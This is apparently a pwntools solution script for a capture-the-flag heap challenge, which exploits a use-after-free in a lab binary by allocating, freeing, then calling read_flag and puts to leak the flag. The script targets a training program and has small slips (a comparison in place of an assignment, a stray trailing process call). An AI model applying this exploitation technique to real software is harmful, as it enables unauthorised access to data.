#!/usr/bin/python3

from pwn import *

context.arch = "amd64"
context.log_level == "error"

elf = context.binary = ELF("/challenge/freebie-easy")

def malloc(io,size):
    data = io.recvuntil(b"Function (malloc/free/puts/read_flag/quit):")
    print(data.decode())
    io.sendline(b"malloc")
    s = io.recvuntil(b"Size:")
    print(s.decode())
    io.sendline(str(size).encode())
    return io

def puts(io):
    data = io.recvuntil(b"Function (malloc/free/puts/read_flag/quit):")
    print(data.decode())
    io.sendline(b"puts")
    return io

def free(io):
    data = io.recvuntil(b"Function (malloc/free/puts/read_flag/quit):")
    print(data.decode())
    io.sendline(b"free")
    return io

def read_flag(io):
    data = io.recvuntil(b"Function (malloc/free/puts/read_flag/quit):")
    print(data.decode())
    io.sendline(b"read_flag")
    return io

def quit(io):
    data = io.recvuntil(b"Function (malloc/free/puts/read_flag/quit):")
    print(data.decode())
    io.sendline(b"quit")
    return io

def main():
    io = process()
    io = malloc(io,479)
    io = free(io)
    io = read_flag(io)
    io = puts(io)
    io = quit(io)
    io.interactive()

if __name__ == "__main__":
    main()


io = process()
